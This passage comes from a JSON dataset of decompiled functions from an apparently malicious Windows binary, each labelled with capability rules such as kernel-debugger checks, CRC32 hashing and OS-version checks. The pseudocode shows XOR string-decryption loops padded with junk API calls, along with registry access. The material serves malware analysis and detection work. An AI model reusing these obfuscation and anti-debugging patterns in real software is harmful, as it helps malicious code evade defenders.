0x6e;\n    var_28h = 0x42746e56;\n    var_24h._0_2_ = 0x6a4f;\n    var_18h._1_1_ = var_1ch;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1b);\n    iVar14 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar15 = 0;\n    var_90h = iVar14;\n    var_2ch = &var_1ch - iVar14;\n    do {\n        iVar16 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n        if (iVar16 != 0x6c91a4) {\n            *(iVar15 + iVar14) = *(&var_28h + iVar15 % var_38h) ^ (iVar15 + iVar14)[&var_1ch - iVar14];\n        }\n        iVar15 = iVar15 + 1;\n    } while (iVar15 < 0x1a);\n    fcn.0040d324();\n    var_14h._0_1_ = 0x3b;\n    var_14h._1_1_ = 6;\n    var_14h._2_1_ = 0x23;\n    var_14h._3_1_ = 0x21;\n    var_10h._0_1_ = 0x55;\n    var_10h._1_1_ = 0x37;\n    var_10h._2_1_ = 0xb;\n    var_10h._3_1_ = 8;\n    var_ch._0_1_ = 0x26;\n    var_ch._1_1_ = 0x3d;\n    var_ch._2_1_ = 0x58;\n    var_ch._3_1_ = 0x2e;\n    var_8h._0_1_ = 1;\n    var_8h._1_1_ = 0xf;\n    var_8h._2_1_ = 0x13;\n    var_8h._3_1_ = 0x28;\n    var_4h._0_1_ = 0x54;\n    var_4h._1_1_ = 0x58;\n    var_28h = 0x4f766368;\n    var_24h._0_2_ = 0x5831;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n    iVar14 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar15 = 0;\n    var_2ch = &var_14h - iVar14;\n    do {\n        iVar16 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n        if (iVar16 != 0xaea805) {\n            *(iVar15 + iVar14) = *(&var_28h + iVar15 % var_38h) ^ (iVar15 + iVar14)[&var_14h - iVar14];\n        }\n        iVar15 = iVar15 + 1;\n    } while (iVar15 < 0x12);\n    fcn.0040d324();\n    var_18h._0_1_ = 0x35;\n    var_18h._1_1_ = 0x51;\n    var_18h._2_1_ = 4;\n    var_18h._3_1_ = 0x36;\n    var_14h._0_1_ = 0x3d;\n    var_14h._1_1_ = 4;\n    var_14h._2_1_ = 0x27;\n    var_14h._3_1_ = 0x53;\n    var_10h._0_1_ = 0x32;\n    var_10h._1_1_ = 0x21;\n    var_10h._2_1_ = 0x27;\n    var_10h._3_1_ = 0x37;\n    var_ch._0_1_ = 0x14;\n    var_ch._1_1_ = 0x5d;\n    var_ch._2_1_ = 0x21;\n    var_ch._3_1_ = 0x26;\n    var_8h._0_1_ = 0x3f;\n    var_8h._1_1_ = 2;\n    var_8h._2_1_ = 1;\n    var_8h._3_1_ = 0x51;\n    var_4h._0_1_ = 0x57;\n    var_28h = 0x4f573466;\n    var_24h._0_2_ = 0x6753;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x16);\n    iVar15 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar16 = 0;\n    var_2ch = &var_18h - iVar15;\n    do {\n        iVar17 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        if (iVar17 != 0x421383) {\n            *(iVar16 + iVar15) = *(&var_28h + iVar16 % var_38h) ^ (iVar16 + iVar15)[&var_18h - iVar15];\n        }\n        iVar16 = iVar16 + 1;\n    } while (iVar16 < 0x15);\n    fcn.0040d324();\n    var_ch._3_1_ = 5;\n    var_1ch._0_1_ = 0x22;\n    var_1ch._1_1_ = 0x12;\n    var_1ch._2_1_ = 0x33;\n    var_1ch._3_1_ = 0x20;\n    var_18h._0_1_ = 0x27;\n    var_18h._1_1_ = 8;\n    var_18h._2_1_ = 0x1d;\n    var_18h._3_1_ = 0x12;\n    var_14h._0_1_ = 0x32;\n    var_14h._1_1_ = 0x2b;\n    var_14h._2_1_ = 0x2a;\n    var_14h._3_1_ = 0xf;\n    var_10h._0_1_ = 0x16;\n    var_10h._1_1_ = 0x16;\n    var_10h._2_1_ = 2;\n    var_10h._3_1_ = 0x27;\n    var_ch._0_1_ = 0x29;\n    var_ch._1_1_ = 4;\n    var_ch._2_1_ = 0x21;\n    var_8h._0_1_ = 0x1f;\n    var_8h._1_1_ = 0x38;\n    var_8h._2_1_ = 0x2f;\n    var_8h._3_1_ = 6;\n    var_4h._0_1_ = 0x14;\n    var_4h._1_1_ = 0x10;\n    var_4h._2_1_ = 0x13;\n    var_4h._3_1_ = 0x4e;\n    var_28h = 0x4e767771;\n    var_24h._0_2_ = 0x6a46;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n    iVar16 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar17 = 0;\n    var_2ch = &var_1ch - iVar16;\n    do {\n        iVar18 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar18 != 0xf98ad1) {\n            *(iVar17 + iVar16) = *(&var_28h + iVar17 % var_38h) ^ (iVar17 + iVar16)[&var_1ch - iVar16];\n        }\n        iVar17 = iVar17 + 1;\n    } while (iVar17 < 0x1c);\n    fcn.0040d324();\n    var_18h._0_1_ = 4;\n    var_18h._1_1_ = 0x37;\n    var_18h._2_1_ = 6;\n    var_18h._3_1_ = 0x39;\n    var_14h._0_1_ = 0x26;\n    var_14h._1_1_ = 0x36;\n    var_14h._2_1_ = 0x35;\n    var_14h._3_1_ = 0x2e;\n    var_10h._0_1_ = 0xe;\n    var_10h._1_1_ = 0x27;\n    var_10h._2_1_ = 0x3b;\n    var_10h._3_1_ = 0x27;\n    var_ch._0_1_ = 0x26;\n    var_ch._1_1_ = 0x3d;\n    var_ch._2_1_ = 0x18;\n    var_ch._3_1_ = 0x25;\n    var_8h._0_1_ = 0x3b;\n    var_8h._1_1_ = 0x3d;\n    var_8h._2_1_ = 0x31;\n    var_8h._3_1_ = 0x24;\n    var_4h._0_1_ = 0x32;\n    var_4h._1_1_ = 0x35;\n    var_4h._2_1_ = 0x2e;\n    var_4h._3_1_ = 0x58;\n    var_68h = 0x584b5257;\n    var_64h._0_1_ = 0x48;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    iVar17 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar18 = 0;\n    var_2ch = &var_18h - iVar17;\n    do {\n        iVar19 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n        if (iVar19 != 0x12b1c8) {\n            *(iVar18 + iVar17) = *(&var_68h + iVar18 % var_34h) ^ (iVar18 + iVar17)[&var_18h - iVar17];\n        }\n        iVar18 = iVar18 + 1;\n    } while (iVar18 < 0x18);\n    fcn.0040d324();\n    var_18h._0_1_ = 0x35;\n    var_18h._1_1_ = 0x15;\n    var_18h._2_1_ = 0xc;\n    var_18h._3_1_ = 0x26;\n    var_14h._0_1_ = 0x37;\n    var_14h._1_1_ = 3;\n    var_14h._2_1_ = 2;\n    var_14h._3_1_ = 0x36;\n    var_10h._0_1_ = 0x24;\n    var_10h._1_1_ = 0x29;\n    var_10h._2_1_ = 7;\n    var_10h._3_1_ = 4;\n    var_ch._0_1_ = 0x20;\n    var_ch._1_1_ = 0x1b;\n    var_ch._2_1_ = 0x35;\n    var_ch._3_1_ = 0xf;\n    var_8h._0_1_ = 6;\n    var_8h._1_1_ = 0x2c;\n    var_8h._2_1_ = 0x27;\n    var_8h._3_1_ = 0x22;\n    var_4h._0_1_ = 1;\n    var_4h._1_1_ = 0x15;\n    var_4h._2_1_ = 0x45;\n    var_60h = 0x4b457066;\n    var_5ch._0_1_ = 0x47;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n    iVar18 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar19 = 0;\n    var_68h = iVar18;\n    var_2ch = &var_18h - iVar18;\n    do {\n        iVar20 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar20 != 0xaf49a) {\n            *(iVar19 + iVar18) = *(&var_60h + iVar19 % var_34h) ^ (iVar19 + iVar18)[&var_18h - iVar18];\n        }\n        iVar19 = iVar19 + 1;\n    } while (iVar19 < 0x17);\n    fcn.0040d324();\n    var_18h._0_1_ = 0x16;\n    var_18h._1_1_ = 4;\n    var_18h._2_1_ = 0;\n    var_18h._3_1_ = 0x35;\n    var_14h._0_1_ = 0x12;\n    var_14h._1_1_ = 0x24;\n    var_14h._2_1_ = 0x15;\n    var_14h._3_1_ = 0x26;\n    var_10h._0_1_ = 0;\n    var_10h._1_1_ = 0x1b;\n    var_10h._2_1_ = 0x2a;\n    var_10h._3_1_ = 3;\n    var_ch._0_1_ = 0x22;\n    var_ch._1_1_ = 0x2b;\n    var_ch._2_1_ = 0x27;\n    var_ch._3_1_ = 0x37;\n    var_8h._0_1_ = 8;\n    var_8h._1_1_ = 0x35;\n    var_8h._2_1_ = 0x2e;\n    var_8h._3_1_ = 0x1b;\n    var_4h._0_1_ = 0x20;\n    var_4h._1_1_ = 6;\n    var_4h._2_1_ = 0x26;\n    var_4h._3_1_ = 0x47;\n    var_58h = 0x47436145;\n    var_54h._0_1_ = 0x77;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    iVar18 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar19 = 0;\n    var_60h = iVar18;\n    var_2ch = &var_18h - iVar18;\n    do {\n        iVar20 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        if (iVar20 != 0xa14de3) {\n            *(iVar19 + iVar18) = *(&var_58h + iVar19 % var_34h) ^ (iVar19 + iVar18)[&var_18h - iVar18];\n        }\n        iVar19 = iVar19 + 1;\n    } while (iVar19 < 0x18);\n    fcn.0040d324();\n    var_20h._0_1_ = 1;\n    var_20h._1_1_ = 0x26;\n    var_20h._2_1_ = 0x31;\n    var_20h._3_1_ = 0x1d;\n    var_1ch._0_1_ = 0x46;\n    var_1ch._1_1_ = 0x34;\n    var_1ch._2_1_ = 0x26;\n    var_1ch._3_1_ = 0x26;\n    var_18h._0_1_ = 1;\n    var_18h._1_1_ = 0x2c;\n    var_18h._2_1_ = 0x41;\n    var_18h._3_1_ = 0x22;\n    var_14h._0_1_ = 0x36;\n    var_14h._1_1_ = 0xe;\n    var_14h._2_1_ = 4;\n    var_14h._3_1_ = 1;\n    var_10h._0_1_ = 0x72;\n    var_10h._1_1_ = 0x24;\n    var_10h._2_1_ = 0x31;\n    var_10h._3_1_ = 0x26;\n    var_ch._0_1_ = 0x16;\n    var_ch._1_1_ = 0x1c;\n    var_ch._2_1_ = 99;\n    var_ch._3_1_ = 0x35;\n    var_8h._0_1_ = 0x3b;\n    var_8h._1_1_ = 0x35;\n    var_8h._2_1_ = 0xc;\n    var_8h._3_1_ = 3;\n    var_4h._0_1_ = 0x56;\n    var_4h._1_1_ = 0x20;\n    var_4h._2_1_ = 0x37;\n    var_4h._3_1_ = 0x43;\n    var_28h = 0x6f654352;\n    var_24h._0_2_ = 0x4733;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    iVar18 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar19 = 0;\n    var_58h = iVar18;\n    var_2ch = &var_20h - iVar18;\n    do {\n        iVar20 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n        if (iVar20 != 0xe936bb) {\n            *(iVar19 + iVar18) = *(&var_28h + iVar19 % var_38h) ^ (iVar19 + iVar18)[&var_20h - iVar18];\n        }\n        iVar19 = iVar19 + 1;\n    } while (iVar19 < 0x20);\n    fcn.0040d324();\n    var_14h._0_1_ = 0x1a;\n    var_14h._1_1_ = 0x3f;\n    var_14h._2_1_ = 0x15;\n    var_14h._3_1_ = 0x31;\n    var_10h._0_1_ = 0x23;\n    var_10h._1_1_ = 0x28;\n    var_10h._2_1_ = 0x38;\n    var_10h._3_1_ = 0x22;\n    var_ch._0_1_ = 0x38;\n    var_ch._1_1_ = 0x1f;\n    var_ch._2_1_ = 0x3b;\n    var_ch._3_1_ = 0x33;\n    var_8h._0_1_ = 0x31;\n    var_8h._1_1_ = 0x3d;\n    var_8h._2_1_ = 0x23;\n    var_8h._3_1_ = 0x2c;\n    var_4h._0_1_ = 0x3d;\n    var_4h._1_1_ = 0x22;\n    var_4h._2_1_ = 0x54;\n    var_48h = 0x54475a49;\n    var_44h._0_1_ = 0x4f;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar18 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar19 = 0;\n    var_2ch = &var_14h - iVar18;\n    do {\n        iVar20 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        if (iVar20 != 0x96df4b) {\n            *(iVar19 + iVar18) = *(&var_48h + iVar19 % var_34h) ^ (iVar19 + iVar18)[&var_14h - iVar18];\n        }\n        iVar19 = iVar19 + 1;\n    } while (iVar19 < 0x13);\n    fcn.0040d324();\n    var_20h._0_1_ = 0x3d;\n    var_20h._1_1_ = 0x34;\n    var_20h._2_1_ = 0x3b;\n    var_20h._3_1_ = 3;\n    var_1ch._0_1_ = 0;\n    var_1ch._1_1_ = 0x1c;\n    var_1ch._2_1_ = 0x34;\n    var_1ch._3_1_ = 0x13;\n    var_18h._0_1_ = 0x1e;\n    var_18h._1_1_ = 6;\n    var_18h._2_1_ = 0x39;\n    var_18h._3_1_ = 0x3e;\n    var_14h._0_1_ = 0;\n    var_14h._2_1_ = 10;\n    var_14h._3_1_ = 0;\n    var_10h._0_1_ = 0x36;\n    var_10h._1_1_ = 0x21;\n    var_10h._2_1_ = 8;\n    var_10h._3_1_ = 0x17;\n    var_ch._0_1_ = 0x3e;\n    var_ch._1_1_ = 0x23;\n    var_ch._2_1_ = 0x1b;\n    var_ch._3_1_ = 0x1b;\n    var_8h._0_1_ = 10;\n    var_8h._1_1_ = 2;\n    var_8h._2_1_ = 0x34;\n    var_8h._3_1_ = 0x15;\n    var_4h._0_1_ = 8;\n    var_4h._1_1_ = 99;\n    var_40h = 0x6d72516e;\n    var_3ch._0_1_ = 99;\n    var_14h._1_1_ = var_18h._1_1_;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n    iVar19 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar20 = 0;\n    var_48h = iVar19;\n    var_2ch = &var_20h - iVar19;\n    do {\n        iVar21 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n        if (iVar21 != 0x5db7b8) {\n            *(iVar20 + iVar19) = *(&var_40h + iVar20 % var_34h) ^ (iVar20 + iVar19)[&var_20h - iVar19];\n        }\n        iVar20 = iVar20 + 1;\n    } while (iVar20 < 0x1e);\n    fcn.0040d324();\n    var_14h._0_1_ = 0x20;\n    var_14h._1_1_ = 0x36;\n    var_14h._2_1_ = 0x1a;\n    var_14h._3_1_ = 0x18;\n    var_10h._0_1_ = 0x3d;\n    var_10h._1_1_ = 0x16;\n    var_10h._2_1_ = 9;\n    var_10h._3_1_ = 0x21;\n    var_ch._0_1_ = 0x1f;\n    var_ch._1_1_ = 0x35;\n    var_ch._2_1_ = 0x23;\n    var_ch._3_1_ = 0x21;\n    var_8h._0_1_ = 0x27;\n    var_8h._1_1_ = 7;\n    var_8h._2_1_ = 0x39;\n    var_8h._3_1_ = 0x1f;\n    var_4h._0_1_ = 0x36;\n    var_4h._1_1_ = 0x29;\n    var_4h._2_1_ = 0x14;\n    var_4h._3_1_ = 0x50;\n    var_28h = 0x714e5373;\n    var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x50);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar19 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar20 = 0;\n    var_40h = iVar19;\n    var_2ch = &var_14h - iVar19;\n    do {\n        iVar21 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n        if (iVar21 != 0xdebbd4) {\n            *(iVar20 + iVar19) = *(&var_28h + iVar20 % var_34h) ^ (iVar20 + iVar19)[&var_14h - iVar19];\n        }\n        iVar20 = iVar20 + 1;\n    } while (iVar20 < 0x14);\n    fcn.0040d324();\n    var_20h._0_1_ = 0x60;\n    var_20h._1_1_ = 6;\n    var_20h._2_1_ = 5;\n    var_20h._3_1_ = 0x3e;\n    var_1ch._0_1_ = 0x29;\n    var_1ch._1_1_ = 4;\n    var_1ch._2_1_ = 0x47;\n    var_18h._0_1_ = 0x15;\n    var_18h._1_1_ = 0x35;\n    var_18h._2_1_ = 0x21;\n    var_18h._3_1_ = 7;\n    var_14h._0_1_ = 0x5c;\n    var_14h._1_1_ = 0xf;\n    var_14h._2_1_ = 0x2f;\n    var_14h._3_1_ = 0x2f;\n    var_10h._0_1_ = 0;\n    var_10h._1_1_ = 0xc;\n    var_10h._2_1_ = 0x5d;\n    var_10h._3_1_ = 8;\n    var_ch._0_1_ = 0x16;\n    var_ch._1_1_ = 0x3e;\n    var_ch._2_1_ = 0x25;\n    var_ch._3_1_ = 0x13;\n    var_8h._0_1_ = 0x5a;\n    var_8h._1_1_ = 0xf;\n    var_8h._2_1_ = 0x23;\n    var_8h._3_1_ = 0x2b;\n    var_4h._0_1_ = 0x29;\n    var_4h._1_1_ = 0x65;\n    var_28h = 0x4c466333;\n    var_24h._0_2_ = 0x654c;\n    var_1ch._3_1_ = var_20h._1_1_;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n    iVar19 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar20 = 0;\n    var_2ch = &var_20h - iVar19;\n    do {\n        iVar21 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n        if (iVar21 != 0x8fb7ca) {\n            *(iVar20 + iVar19) = *(&var_28h + iVar20 % var_38h) ^ (iVar20 + iVar19)[&var_20h - iVar19];\n        }\n        iVar20 = iVar20 + 1;\n    } while (iVar20 < 0x1e);\n    fcn.0040d324();\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar19);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar2)(0, var_40h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_48h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar18);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_58h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_60h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_68h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar17);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar16);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar15);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar14);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_90h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar13);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_a0h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar12);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar11);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_b0h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar10);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_b8h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_c0h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar9);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar8);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_c8h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_50h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar7);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar6);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_70h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_78h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_80h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_88h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_98h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar5);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar22);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_a8h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar4);\n    (*pcVar1)(uVar3);\n    return;\n}\n",
        "token_count": 22041
    },
    "004038d4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004038d4(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if ((arg_8h & 0x20006) == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000001);\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(0x80000001);\n    }\n    uVar2 = 0;\n    if (iVar1 == 0) {\n        uVar2 = arg_8h;\n    }\n    return uVar2;\n}\n",
        "token_count": 151
    },
    "00404235": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar * fcn.00404235(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uchar *puVar5;\n    uchar *puVar6;\n    int32_t iVar7;\n    uchar *puVar8;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_27h;\n    uint var_23h;\n    uint var_1fh;\n    uint var_1bh;\n    uint var_17h;\n    uint var_13h;\n    uchar *var_fh;\n    uchar *var_8h;\n    uint var_4h;\n    \n    var_44h = 0x6b114e16;\n    var_40h = 0x4e134504;\n    var_3ch = 0x45016b16;\n    var_38h = 0x6b1b4e10;\n    var_34h = 0x4e1d450e;\n    var_30h = 0x450b6b18;\n    var_2ch._0_1_ = 0x1a;\n    stack0xffffffd1 = 0x86b1d4e;\n    var_27h = 0x24e0745;\n    var_23h = 0x445156b;\n    var_1fh = 0x126b074e;\n    var_1bh = 0x44e0145;\n    var_17h = 0xe451f6b;\n    var_13h = 0x676b094e;\n    var_fh._0_1_ = 0x45;\n    var_8h = 0x6b734e77;\n    var_4h._0_2_ = 0x4567;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x6d);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar3 != 0x1ba119) {\n            stack0xfffffff0 = 0x6;\n            *(iVar7 + iVar2) = *(&var_8h + iVar7 % 6) ^ (iVar7 + iVar2)[&var_44h - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x36);\n    uVar4 = fcn.004040e0();\n    puVar6 = (uVar4 & 1) + 8;\n    puVar5 = stack0xfffffff0;\n    if (puVar6 != NULL) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, puVar6 * 2 + 2);\n        puVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        var_8h = puVar5;\n        if (puVar5 != NULL) {\n            stack0xfffffff0 = NULL;\n            puVar8 = puVar5;\n            for (iVar7 = puVar6 * 2 + 2; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n            if (puVar6 != NULL) {\n                do {\n                    iVar7 = fcn.004040e0();\n                    *(puVar5 + stack0xfffffff0 * 2) = *(iVar2 + (iVar7 % 0x1a) * 2);\n                    *0x4 = stack0xfffffff0 + 1;\n                } while (*0x4 < puVar6);\n            }\n            *(puVar5 + puVar6 * 2) = 0;\n        }\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return puVar5;\n}\n",
        "token_count": 957
    },
    "004057a4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004057a4(char *param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = 0xffffffff;\n    if (param_2 != 0) {\n        do {\n            uVar4 = *param_1;\n            param_2 = param_2 + -1;\n            param_1 = param_1 + 1;\n            iVar2 = 8;\n            do {\n                uVar1 = uVar4 ^ uVar3;\n                uVar3 = uVar3 >> 1;\n                if ((uVar1 & 1) != 0) {\n                    uVar3 = uVar3 ^ 0xedb88320;\n                }\n                uVar4 = uVar4 >> 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        } while (param_2 != 0);\n    }\n    return uVar3;\n}\n",
        "token_count": 236
    },
    "0040852b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040852b(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    int32_t iVar4;\n    int32_t lpBuffer;\n    int32_t lpNumberOfBytesRead;\n    uint lpFileName;\n    int32_t lDistanceToMove;\n    int32_t var_4h;\n    \n    iVar4 = 0;\n    var_4h = 0;\n    iVar2 = fcn.004093ea();\n    if (iVar2 == 0) {\n        iVar2 = fcn.00406f1f(extraout_ECX);\n        if ((iVar2 != 0) && (lDistanceToMove = fcn.00406fa5(),  lDistanceToMove != 0)) {\n            cVar1 = '\\0';\n            if (((*0x41db4c & 1) != 0) && (*(*(param_1 + 0x3c) + 4 + param_1) == 0x14c)) {\n                cVar1 = fcn.004083b2();\n                cVar1 = '\\x01' - (cVar1 != '\\0');\n            }\n            iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0x80000000, 1, 0, 3, 0x80, 0);\n            if (iVar4 != -1) {\n                iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointer)(iVar4, lDistanceToMove, 0, 0);\n                if (((iVar2 == lDistanceToMove) &&\n                    (iVar2 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar4, &lpBuffer, 4, &lpNumberOfBytesRead, 0), \n                    iVar2 != 0)) && (lpNumberOfBytesRead == 4)) {\n                    var_4h = lpBuffer + param_1;\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n            }\n            iVar4 = var_4h;\n            if (cVar1 != '\\0') {\n                fcn.004083b2();\n                iVar4 = var_4h;\n            }\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return iVar4;\n}\n",
        "token_count": 540
    },
    "0040392d": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040392d(uchar *param_1)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int16_t *piVar7;\n    uchar *puVar8;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uchar *var_4h;\n    \n    if (param_1 != NULL) {\n        puVar8 = param_1;\n        for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        var_4h = param_1;\n        cVar2 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n        if (cVar2 == '\\x05') {\n            var_24h = 0x473d7264;\n            var_20h = 0x72436f3f;\n            var_1ch = 0x6f384725;\n            var_18h = 0x47377245;\n            var_14h._0_2_ = 0x6f59;\n            var_10h = 0x47527237;\n            var_ch._0_2_ = 0x6f59;\n            uVar3 